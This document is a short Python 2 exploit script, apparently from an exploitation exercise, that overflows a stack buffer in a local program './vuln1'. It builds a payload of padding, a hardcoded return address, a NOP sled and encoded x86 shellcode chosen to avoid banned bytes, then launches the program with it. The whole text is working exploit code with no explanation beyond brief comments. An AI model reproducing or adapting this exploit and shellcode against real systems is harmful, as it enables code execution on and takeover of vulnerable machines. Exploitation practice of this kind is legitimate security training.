#!/bin/env python2
import struct
import subprocess

#Banned characters 
# [hijklmn] or [0x68 - 0x6e]

"""Constants"""
prog = "./vuln1"
len_to_addr = 268
ret_addr = 0xbffff504
char = "A"
nop = "\x90"
"""Shell Code (x86)"""

buf =  b""
buf += b"\xbf\x5e\xc0\xc9\xbc\xda\xc6\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x0b\x31\x78\x15\x03\x78\x15\x83\xc0\x04\xe2"
buf += b"\xab\xaa\xc2\xe4\xca\x79\xb3\x7c\xc1\x1e\xb2\x9a\x71"
buf += b"\xce\xb7\x0c\x81\x78\x17\xaf\xe8\x16\xee\xcc\xb8\x0e"
buf += b"\xf8\x12\x3c\xcf\xd6\x70\x55\xa1\x07\x06\xcd\x3d\x0f"
buf += b"\xbb\x84\xdf\x62\xbb"

"""Payload"""
EIP = struct.pack("I", ret_addr)
padding = char * (len_to_addr)
NOP_SLED = nop * 150
payload =  padding + EIP + NOP_SLED + buf
"""Execute"""
subprocess.call([prog, payload])

